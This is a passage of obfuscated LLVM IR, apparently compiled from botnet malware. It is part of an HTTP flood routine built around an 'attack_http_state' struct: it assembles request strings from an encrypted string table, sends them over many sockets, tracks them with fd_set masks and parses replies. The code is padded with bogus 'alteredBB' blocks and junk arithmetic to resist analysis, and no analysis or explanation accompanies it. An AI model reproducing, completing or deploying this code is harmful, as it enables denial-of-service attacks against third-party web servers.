  %4446 = call i8* @table_retrieve_val(i32 40, i32* null)
  %4447 = call i32 @util_strcpy(i8* %4445, i8* %4446)
  call void @table_lock_val(i8 zeroext 40)
  %4448 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4449 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4450 = call i32 @util_strlen(i8* %4449)
  %4451 = sext i32 %4450 to i64
  %4452 = getelementptr inbounds i8, i8* %4448, i64 %4451
  %4453 = call i32 @util_strcpy(i8* %4452, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %4454 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4455 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4456 = call i32 @util_strlen(i8* %4455)
  %4457 = sext i32 %4456 to i64
  %4458 = getelementptr inbounds i8, i8* %4454, i64 %4457
  %4459 = call i8* @table_retrieve_val(i32 41, i32* null)
  %4460 = call i32 @util_strcpy(i8* %4458, i8* %4459)
  call void @table_lock_val(i8 zeroext 41)
  %4461 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4462 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4463 = call i32 @util_strlen(i8* %4462)
  %4464 = sext i32 %4463 to i64
  %4465 = getelementptr inbounds i8, i8* %4461, i64 %4464
  %4466 = call i32 @util_strcpy(i8* %4465, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %4467 = load i8*, i8** %22, align 8
  %4468 = icmp ne i8* %4467, null
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %1025
  %4469 = load i32, i32* %18, align 4
  %4470 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4471 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4470, i32 0, i32 15
  %4472 = load i32, i32* %4471, align 4
  %4473 = icmp slt i32 %4469, %4472
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %1066
  %4474 = load i32, i32* %18, align 4
  %_125 = shl i32 %4474, 1
  %_126 = sub i32 %4474, 1
  %gen127 = mul i32 %_126, 1
  %_128 = sub i32 0, %4474
  %gen129 = add i32 %_128, 1
  %_130 = sub i32 0, %4474
  %gen131 = add i32 %_130, 1
  %_132 = sub i32 %4474, 1
  %gen133 = mul i32 %_132, 1
  %4475 = add nsw i32 %4474, 1
  store i32 %4475, i32* %18, align 4
  br label %originalBB124

originalBB137alteredBB:                           ; preds = %originalBB137, %1085
  %4476 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4477 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4478 = call i32 @util_strlen(i8* %4477)
  %4479 = sext i32 %4478 to i64
  %4480 = getelementptr inbounds i8, i8* %4476, i64 %4479
  %4481 = call i32 @util_strcpy(i8* %4480, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %1125
  %4482 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4483 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4482, i32 0, i32 9
  %4484 = getelementptr inbounds [9 x i8], [9 x i8]* %4483, i32 0, i32 0
  %4485 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4485, i32 0, i32 10
  %4487 = getelementptr inbounds [9 x i8], [9 x i8]* %4486, i32 0, i32 0
  %4488 = call signext i8 @util_strcmp(i8* %4484, i8* %4487)
  %4489 = icmp ne i8 %4488, 0
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %1158
  %4490 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4491 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4490, i32 0, i32 0
  %4492 = load i32, i32* %4491, align 4
  %4493 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4494 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4495 = call i32 @util_strlen(i8* %4494)
  %4496 = sext i32 %4495 to i64
  %4497 = call i64 @send(i32 %4492, i8* %4493, i64 %4496, i32 16384)
  %4498 = load i32, i32* %35, align 4
  %4499 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4500 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4499, i32 0, i32 3
  store i32 %4498, i32* %4500, align 4
  %4501 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4501, i32 0, i32 1
  store i8 6, i8* %4502, align 4
  %4503 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4504 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4503, i32 0, i32 0
  %4505 = load i32, i32* %4504, align 4
  %_146 = sub i32 0, %4505
  %gen147 = add i32 %_146, 64
  %_148 = sub i32 0, %4505
  %gen149 = add i32 %_148, 64
  %_150 = sub i32 0, %4505
  %gen151 = add i32 %_150, 64
  %4506 = srem i32 %4505, 64
  %4507 = zext i32 %4506 to i64
  %_152 = sub i64 0, 1
  %gen153 = add i64 %_152, %4507
  %_154 = sub i64 1, %4507
  %gen155 = mul i64 %_154, %4507
  %_156 = sub i64 1, %4507
  %gen157 = mul i64 %_156, %4507
  %_158 = shl i64 1, %4507
  %_159 = sub i64 0, 1
  %gen160 = add i64 %_159, %4507
  %4508 = shl i64 1, %4507
  %4509 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %4510 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4511 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4510, i32 0, i32 0
  %4512 = load i32, i32* %4511, align 4
  %4513 = sdiv i32 %4512, 64
  %4514 = sext i32 %4513 to i64
  %4515 = getelementptr inbounds [16 x i64], [16 x i64]* %4509, i64 0, i64 %4514
  %4516 = load i64, i64* %4515, align 8
  %_161 = sub i64 %4516, %4508
  %gen162 = mul i64 %_161, %4508
  %_163 = sub i64 0, %4516
  %gen164 = add i64 %_163, %4508
  %_165 = shl i64 %4516, %4508
  %4517 = or i64 %4516, %4508
  store i64 %4517, i64* %4515, align 8
  %4518 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4519 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4518, i32 0, i32 0
  %4520 = load i32, i32* %4519, align 4
  %4521 = load i32, i32* %31, align 4
  %4522 = icmp sgt i32 %4520, %4521
  br label %originalBB145

originalBB169alteredBB:                           ; preds = %originalBB169, %1208
  %4523 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4523, i32 0, i32 0
  %4525 = load i32, i32* %4524, align 4
  %_170 = shl i32 %4525, 1
  %_171 = shl i32 %4525, 1
  %_172 = sub i32 %4525, 1
  %gen173 = mul i32 %_172, 1
  %_174 = sub i32 0, %4525
  %gen175 = add i32 %_174, 1
  %_176 = sub i32 %4525, 1
  %gen177 = mul i32 %_176, 1
  %_178 = sub i32 %4525, 1
  %gen179 = mul i32 %_178, 1
  %4526 = add nsw i32 %4525, 1
  store i32 %4526, i32* %31, align 4
  br label %originalBB169

originalBB183alteredBB:                           ; preds = %originalBB183, %1236
  %4527 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4528 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4527, i32 0, i32 0
  %4529 = load i32, i32* %4528, align 4
  %_184 = sub i32 0, %4529
  %gen185 = add i32 %_184, 64
  %_186 = sub i32 0, %4529
  %gen187 = add i32 %_186, 64
  %4530 = srem i32 %4529, 64
  %4531 = zext i32 %4530 to i64
  %_188 = sub i64 0, 1
  %gen189 = add i64 %_188, %4531
  %_190 = sub i64 0, 1
  %gen191 = add i64 %_190, %4531
  %_192 = sub i64 0, 1
  %gen193 = add i64 %_192, %4531
  %_194 = sub i64 0, 1
  %gen195 = add i64 %_194, %4531
  %_196 = sub i64 0, 1
  %gen197 = add i64 %_196, %4531
  %_198 = sub i64 0, 1
  %gen199 = add i64 %_198, %4531
  %_200 = sub i64 1, %4531
  %gen201 = mul i64 %_200, %4531
  %4532 = shl i64 1, %4531
  %4533 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %4534 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4535 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4534, i32 0, i32 0
  %4536 = load i32, i32* %4535, align 4
  %_202 = sub i32 0, %4536
  %gen203 = add i32 %_202, 64
  %_204 = shl i32 %4536, 64
  %_205 = sub i32 %4536, 64
  %gen206 = mul i32 %_205, 64
  %_207 = sub i32 0, %4536
  %gen208 = add i32 %_207, 64
  %4537 = sdiv i32 %4536, 64
  %4538 = sext i32 %4537 to i64
  %4539 = getelementptr inbounds [16 x i64], [16 x i64]* %4533, i64 0, i64 %4538
  %4540 = load i64, i64* %4539, align 8
  %_209 = sub i64 %4540, %4532
  %gen210 = mul i64 %_209, %4532
  %_211 = sub i64 %4540, %4532
  %gen212 = mul i64 %_211, %4532
  %_213 = shl i64 %4540, %4532
  %_214 = sub i64 0, %4540
  %gen215 = add i64 %_214, %4532
  %_216 = sub i64 %4540, %4532
  %gen217 = mul i64 %_216, %4532
  %_218 = sub i64 0, %4540
  %gen219 = add i64 %_218, %4532
  %_220 = shl i64 %4540, %4532
  %_221 = shl i64 %4540, %4532
  %_222 = sub i64 0, %4540
  %gen223 = add i64 %_222, %4532
  %4541 = or i64 %4540, %4532
  store i64 %4541, i64* %4539, align 8
  %4542 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4543 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4542, i32 0, i32 0
  %4544 = load i32, i32* %4543, align 4
  %4545 = load i32, i32* %31, align 4
  %4546 = icmp sgt i32 %4544, %4545
  br label %originalBB183

originalBB227alteredBB:                           ; preds = %originalBB227, %1273
  %4547 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4548 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4547, i32 0, i32 0
  %4549 = load i32, i32* %4548, align 4
  %4550 = add nsw i32 %4549, 1
  store i32 %4550, i32* %31, align 4
  br label %originalBB227

originalBB231alteredBB:                           ; preds = %originalBB231, %1294
  br label %originalBB231

originalBB235alteredBB:                           ; preds = %originalBB235, %1343
  br label %originalBB235

originalBB239alteredBB:                           ; preds = %originalBB239, %1366
  %4551 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4552 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4551, i32 0, i32 0
  %4553 = load i32, i32* %4552, align 4
  %4554 = srem i32 %4553, 64
  %4555 = zext i32 %4554 to i64
  %_240 = sub i64 0, 1
  %gen241 = add i64 %_240, %4555
  %_242 = shl i64 1, %4555
  %_243 = sub i64 0, 1
  %gen244 = add i64 %_243, %4555
  %_245 = sub i64 0, 1
  %gen246 = add i64 %_245, %4555
  %4556 = shl i64 1, %4555
  %4557 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %4558 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4559 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4558, i32 0, i32 0
  %4560 = load i32, i32* %4559, align 4
  %_247 = sub i32 %4560, 64
  %gen248 = mul i32 %_247, 64
  %_249 = sub i32 0, %4560
  %gen250 = add i32 %_249, 64
  %4561 = sdiv i32 %4560, 64
  %4562 = sext i32 %4561 to i64
  %4563 = getelementptr inbounds [16 x i64], [16 x i64]* %4557, i64 0, i64 %4562
  %4564 = load i64, i64* %4563, align 8
  %_251 = sub i64 %4564, %4556
  %gen252 = mul i64 %_251, %4556
  %_253 = shl i64 %4564, %4556
  %4565 = or i64 %4564, %4556
  store i64 %4565, i64* %4563, align 8
  %4566 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4567 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4566, i32 0, i32 0
  %4568 = load i32, i32* %4567, align 4
  %4569 = load i32, i32* %31, align 4
  %4570 = icmp sgt i32 %4568, %4569
  br label %originalBB239

originalBB257alteredBB:                           ; preds = %originalBB257, %1403
  %4571 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4571, i32 0, i32 0
  %4573 = load i32, i32* %4572, align 4
  %_258 = sub i32 0, %4573
  %gen259 = add i32 %_258, 1
  %_260 = sub i32 %4573, 1
  %gen261 = mul i32 %_260, 1
  %_262 = sub i32 %4573, 1
  %gen263 = mul i32 %_262, 1
  %_264 = shl i32 %4573, 1
  %_265 = sub i32 %4573, 1
  %gen266 = mul i32 %_265, 1
  %_267 = shl i32 %4573, 1
  %_268 = sub i32 0, %4573
  %gen269 = add i32 %_268, 1
  %_270 = sub i32 %4573, 1
  %gen271 = mul i32 %_270, 1
  %_272 = sub i32 0, %4573
  %gen273 = add i32 %_272, 1
  %4574 = add nsw i32 %4573, 1
  store i32 %4574, i32* %31, align 4
  br label %originalBB257

originalBB277alteredBB:                           ; preds = %originalBB277, %1440
  %4575 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4575, i32 0, i32 1
  store i8 0, i8* %4576, align 4
  %4577 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4577, i32 0, i32 0
  %4579 = load i32, i32* %4578, align 4
  %4580 = call i32 @close(i32 %4579)
  %4581 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4582 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4581, i32 0, i32 0
  store i32 -1, i32* %4582, align 4
  br label %originalBB277

originalBB281alteredBB:                           ; preds = %originalBB281, %1468
  br label %originalBB281

originalBB285alteredBB:                           ; preds = %originalBB285, %1487
  br label %originalBB285

originalBB289alteredBB:                           ; preds = %originalBB289, %1521
  store i32 0, i32* %17, align 4
  br label %originalBB289

originalBB293alteredBB:                           ; preds = %originalBB293, %1551
  br label %originalBB293

originalBB297alteredBB:                           ; preds = %originalBB297, %1568
  %4583 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %4584 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4585 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4584, i32 0, i32 0
  %4586 = load i32, i32* %4585, align 4
  %_298 = shl i32 %4586, 64
  %_299 = sub i32 %4586, 64
  %gen300 = mul i32 %_299, 64
  %_301 = shl i32 %4586, 64
  %_302 = sub i32 %4586, 64
  %gen303 = mul i32 %_302, 64
  %4587 = sdiv i32 %4586, 64
  %4588 = sext i32 %4587 to i64
  %4589 = getelementptr inbounds [16 x i64], [16 x i64]* %4583, i64 0, i64 %4588
  %4590 = load i64, i64* %4589, align 8
  %4591 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4592 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4591, i32 0, i32 0
  %4593 = load i32, i32* %4592, align 4
  %_304 = sub i32 %4593, 64
  %gen305 = mul i32 %_304, 64
  %_306 = shl i32 %4593, 64
  %_307 = sub i32 0, %4593
  %gen308 = add i32 %_307, 64
  %_309 = sub i32 %4593, 64
  %gen310 = mul i32 %_309, 64
  %4594 = srem i32 %4593, 64
  %4595 = zext i32 %4594 to i64
  %_311 = sub i64 0, 1
  %gen312 = add i64 %_311, %4595
  %_313 = sub i64 1, %4595
  %gen314 = mul i64 %_313, %4595
  %_315 = sub i64 0, 1
  %gen316 = add i64 %_315, %4595
  %_317 = sub i64 0, 1
  %gen318 = add i64 %_317, %4595
  %_319 = sub i64 1, %4595
  %gen320 = mul i64 %_319, %4595
  %_321 = sub i64 0, 1
  %gen322 = add i64 %_321, %4595
  %_323 = sub i64 0, 1
  %gen324 = add i64 %_323, %4595
  %_325 = shl i64 1, %4595
  %4596 = shl i64 1, %4595
  %4597 = and i64 %4590, %4596
  %4598 = icmp ne i64 %4597, 0
  br label %originalBB297

originalBB329alteredBB:                           ; preds = %originalBB329, %1615
  %4599 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4600 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4599, i32 0, i32 0
  %4601 = load i32, i32* %4600, align 4
  %4602 = call i32 @close(i32 %4601)
  %4603 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4603, i32 0, i32 0
  store i32 -1, i32* %4604, align 4
  %4605 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4605, i32 0, i32 1
  store i8 0, i8* %4606, align 4
  br label %originalBB329

originalBB333alteredBB:                           ; preds = %originalBB333, %1640
  br label %originalBB333

originalBB337alteredBB:                           ; preds = %originalBB337, %1674
  %4607 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4608 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4607, i32 0, i32 1
  %4609 = load i8, i8* %4608, align 4
  %4610 = zext i8 %4609 to i32
  %4611 = icmp eq i32 %4610, 6
  br label %originalBB337

originalBB341alteredBB:                           ; preds = %originalBB341, %1722
  br label %originalBB341

originalBB345alteredBB:                           ; preds = %originalBB345, %1770
  %4612 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4613 = load i32, i32* %20, align 4
  %4614 = call i8* @table_retrieve_val(i32 51, i32* null)
  %4615 = call i32 @util_stristr(i8* %4612, i32 %4613, i8* %4614)
  store i32 %4615, i32* %46, align 4
  %4616 = load i32, i32* %46, align 4
  %4617 = sext i32 %4616 to i64
  %4618 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4617
  %4619 = load i8, i8* %4618, align 1
  %4620 = sext i8 %4619 to i32
  %4621 = icmp eq i32 %4620, 32
  br label %originalBB345

originalBB349alteredBB:                           ; preds = %originalBB349, %1820
  %4622 = load i32, i32* %46, align 4
  %4623 = load i32, i32* %47, align 4
  %_350 = sub i32 0, %4622
  %gen351 = add i32 %_350, %4623
  %_352 = sub i32 %4622, %4623
  %gen353 = mul i32 %_352, %4623
  %_354 = shl i32 %4622, %4623
  %_355 = sub i32 %4622, %4623
  %gen356 = mul i32 %_355, %4623
  %_357 = sub i32 %4622, %4623
  %gen358 = mul i32 %_357, %4623
  %4624 = add nsw i32 %4622, %4623
  %4625 = sext i32 %4624 to i64
  %4626 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4625
  store i8 0, i8* %4626, align 1
  %4627 = load i8*, i8** %48, align 8
  %4628 = load i8*, i8** %48, align 8
  %4629 = call i32 @util_strlen(i8* %4628)
  %4630 = call i8* @table_retrieve_val(i32 50, i32* null)
  %4631 = call i32 @util_stristr(i8* %4627, i32 %4629, i8* %4630)
  %4632 = icmp ne i32 %4631, 0
  br label %originalBB349

originalBB362alteredBB:                           ; preds = %originalBB362, %1848
  %4633 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4634 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4633, i32 0, i32 12
  store i32 1, i32* %4634, align 4
  br label %originalBB362

originalBB366alteredBB:                           ; preds = %originalBB366, %1888
  %4635 = load i32, i32* %49, align 4
  %_367 = sub i32 %4635, 1
  %gen368 = mul i32 %_367, 1
  %_369 = sub i32 0, %4635
  %gen370 = add i32 %_369, 1
  %_371 = sub i32 0, %4635
  %gen372 = add i32 %_371, 1
  %_373 = shl i32 %4635, 1
  %_374 = sub i32 %4635, 1
  %gen375 = mul i32 %_374, 1
  %_376 = sub i32 0, %4635
  %gen377 = add i32 %_376, 1
  %4636 = add nsw i32 %4635, 1
  store i32 %4636, i32* %49, align 4
  br label %originalBB366

originalBB381alteredBB:                           ; preds = %originalBB381, %1907
  %4637 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4638 = load i32, i32* %49, align 4
  %4639 = sext i32 %4638 to i64
  %4640 = getelementptr inbounds i8, i8* %4637, i64 %4639
  %4641 = load i32, i32* %20, align 4
  %4642 = load i32, i32* %49, align 4
  %_382 = sub i32 0, %4641
  %gen383 = add i32 %_382, %4642
  %_384 = sub i32 %4641, %4642
  %gen385 = mul i32 %_384, %4642
  %_386 = shl i32 %4641, %4642
  %_387 = sub i32 %4641, %4642
  %gen388 = mul i32 %_387, %4642
  %4643 = sub nsw i32 %4641, %4642
  %4644 = call i32 @util_memsearch(i8* %4640, i32 %4643, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4644, i32* %50, align 4
  %4645 = load i32, i32* %50, align 4
  %4646 = icmp ne i32 %4645, -1
  br label %originalBB381

originalBB392alteredBB:                           ; preds = %originalBB392, %1940
  %4647 = load i32, i32* %50, align 4
  %_393 = shl i32 %4647, 2
  %_394 = sub i32 0, %4647
  %gen395 = add i32 %_394, 2
  %_396 = sub i32 0, %4647
  %gen397 = add i32 %_396, 2
  %_398 = shl i32 %4647, 2
  %_399 = sub i32 %4647, 2
  %gen400 = mul i32 %_399, 2
  %4648 = sub nsw i32 %4647, 2
  store i32 %4648, i32* %50, align 4
  br label %originalBB392

originalBB404alteredBB:                           ; preds = %originalBB404, %1959
  %4649 = load i32, i32* %49, align 4
  %4650 = load i32, i32* %50, align 4
  %_405 = shl i32 %4649, %4650
  %4651 = add nsw i32 %4649, %4650
  %4652 = sext i32 %4651 to i64
  %4653 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4652
  store i8 0, i8* %4653, align 1
  %4654 = load i8*, i8** %51, align 8
  %4655 = load i8*, i8** %51, align 8
  %4656 = call i32 @util_strlen(i8* %4655)
  %4657 = call i8* @table_retrieve_val(i32 49, i32* null)
  %4658 = call i32 @util_stristr(i8* %4654, i32 %4656, i8* %4657)
  %4659 = icmp ne i32 %4658, 0
  br label %originalBB404

originalBB409alteredBB:                           ; preds = %originalBB409, %1987
  %4660 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4661 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4660, i32 0, i32 13
  store i32 1, i32* %4661, align 4
  br label %originalBB409

originalBB413alteredBB:                           ; preds = %originalBB413, %2028
  %4662 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4663 = load i32, i32* %52, align 4
  %4664 = sext i32 %4663 to i64
  %4665 = getelementptr inbounds i8, i8* %4662, i64 %4664
  %4666 = load i32, i32* %20, align 4
  %4667 = load i32, i32* %52, align 4
  %_414 = sub i32 0, %4666
  %gen415 = add i32 %_414, %4667
  %_416 = shl i32 %4666, %4667
  %4668 = sub nsw i32 %4666, %4667
  %4669 = call i32 @util_memsearch(i8* %4665, i32 %4668, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4669, i32* %53, align 4
  %4670 = load i32, i32* %53, align 4
  %4671 = icmp ne i32 %4670, -1
  br label %originalBB413

originalBB420alteredBB:                           ; preds = %originalBB420, %2141
  %4672 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4673 = load i32, i32* %45, align 4
  %4674 = sext i32 %4673 to i64
  %4675 = getelementptr inbounds i8, i8* %4672, i64 %4674
  %4676 = load i32, i32* %55, align 4
  %4677 = sext i32 %4676 to i64
  %4678 = getelementptr inbounds i8, i8* %4675, i64 %4677
  %4679 = load i32, i32* %20, align 4
  %4680 = load i32, i32* %45, align 4
  %_421 = sub i32 0, %4679
  %gen422 = add i32 %_421, %4680
  %_423 = shl i32 %4679, %4680
  %_424 = shl i32 %4679, %4680
  %_425 = sub i32 0, %4679
  %gen426 = add i32 %_425, %4680
  %4681 = sub nsw i32 %4679, %4680
  %4682 = load i32, i32* %55, align 4
  %_427 = sub i32 %4681, %4682
  %gen428 = mul i32 %_427, %4682
  %_429 = sub i32 0, %4681
  %gen430 = add i32 %_429, %4682
  %4683 = sub nsw i32 %4681, %4682
  %4684 = call i32 @util_memsearch(i8* %4678, i32 %4683, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %4685 = icmp sgt i32 %4684, 0
  br label %originalBB420

originalBB434alteredBB:                           ; preds = %originalBB434, %2172
  %4686 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4687 = load i32, i32* %45, align 4
  %4688 = sext i32 %4687 to i64
  %4689 = getelementptr inbounds i8, i8* %4686, i64 %4688
  %4690 = load i32, i32* %55, align 4
  %4691 = sext i32 %4690 to i64
  %4692 = getelementptr inbounds i8, i8* %4689, i64 %4691
  %4693 = load i32, i32* %20, align 4
  %4694 = load i32, i32* %45, align 4
  %_435 = sub i32 0, %4693
  %gen436 = add i32 %_435, %4694
  %_437 = sub i32 0, %4693
  %gen438 = add i32 %_437, %4694
  %_439 = shl i32 %4693, %4694
  %_440 = sub i32 %4693, %4694
  %gen441 = mul i32 %_440, %4694
  %_442 = sub i32 0, %4693
  %gen443 = add i32 %_442, %4694
  %4695 = sub nsw i32 %4693, %4694
  %4696 = load i32, i32* %55, align 4
  %_444 = shl i32 %4695, %4696
  %_445 = sub i32 0, %4695
  %gen446 = add i32 %_445, %4696
  %_447 = sub i32 %4695, %4696
  %gen448 = mul i32 %_447, %4696
  %_449 = sub i32 %4695, %4696
  %gen450 = mul i32 %_449, %4696
  %4697 = sub nsw i32 %4695, %4696
  %4698 = call i32 @util_memsearch(i8* %4692, i32 %4697, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %_451 = sub i32 0, %4698
  %gen452 = add i32 %_451, 1
  %_453 = sub i32 0, %4698
  %gen454 = add i32 %_453, 1
  %_455 = sub i32 0, %4698
  %gen456 = add i32 %_455, 1
  %_457 = sub i32 %4698, 1
  %gen458 = mul i32 %_457, 1
  %_459 = sub i32 %4698, 1
  %gen460 = mul i32 %_459, 1
  %4699 = sub nsw i32 %4698, 1
  store i32 %4699, i32* %56, align 4
  br label %originalBB434

originalBB464alteredBB:                           ; preds = %originalBB464, %2211
  %4700 = load i32, i32* %18, align 4
  %4701 = load i8*, i8** %57, align 8
  %4702 = call i32 @util_strlen(i8* %4701)
  %4703 = icmp slt i32 %4700, %4702
  br label %originalBB464

originalBB468alteredBB:                           ; preds = %originalBB468, %2241
  br label %originalBB468

originalBB472alteredBB:                           ; preds = %originalBB472, %2258
  %4704 = load i32, i32* %18, align 4
  %_473 = sub i32 0, %4704
  %gen474 = add i32 %_473, 1
  %_475 = sub i32 0, %4704
  %gen476 = add i32 %_475, 1
  %4705 = add nsw i32 %4704, 1
  store i32 %4705, i32* %18, align 4
  br label %originalBB472

originalBB480alteredBB:                           ; preds = %originalBB480, %2285
  %4706 = load i32, i32* %18, align 4
  store i32 %4706, i32* %58, align 4
  store i32 0, i32* %59, align 4
  store i32 0, i32* %18, align 4
  br label %originalBB480

originalBB484alteredBB:                           ; preds = %originalBB484, %2321
  br label %originalBB484

originalBB488alteredBB:                           ; preds = %originalBB488, %2338
  %4707 = load i32, i32* %18, align 4
  %_489 = sub i32 0, %4707
  %gen490 = add i32 %_489, 1
  %_491 = sub i32 0, %4707
  %gen492 = add i32 %_491, 1
  %_493 = sub i32 %4707, 1
  %gen494 = mul i32 %_493, 1
  %4708 = add nsw i32 %4707, 1
  store i32 %4708, i32* %18, align 4
  br label %originalBB488

originalBB498alteredBB:                           ; preds = %originalBB498, %2364
  %4709 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4710 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4709, i32 0, i32 16
  %4711 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4712 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4711, i32 0, i32 15
  %4713 = load i32, i32* %4712, align 4
  %4714 = sext i32 %4713 to i64
  %4715 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4710, i64 0, i64 %4714
  %4716 = getelementptr inbounds [128 x i8], [128 x i8]* %4715, i32 0, i32 0
  %4717 = load i8*, i8** %57, align 8
  %4718 = call i32 @util_strcpy(i8* %4716, i8* %4717)
  %4719 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4720 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4719, i32 0, i32 15
  %4721 = load i32, i32* %4720, align 4
  %_499 = shl i32 %4721, 1
  %4722 = add nsw i32 %4721, 1
  store i32 %4722, i32* %4720, align 4
  br label %originalBB498

originalBB503alteredBB:                           ; preds = %originalBB503, %2395
  br label %originalBB503

originalBB507alteredBB:                           ; preds = %originalBB507, %2435
  %4723 = load i32, i32* %60, align 4
  %_508 = shl i32 %4723, 1
  %_509 = sub i32 0, %4723
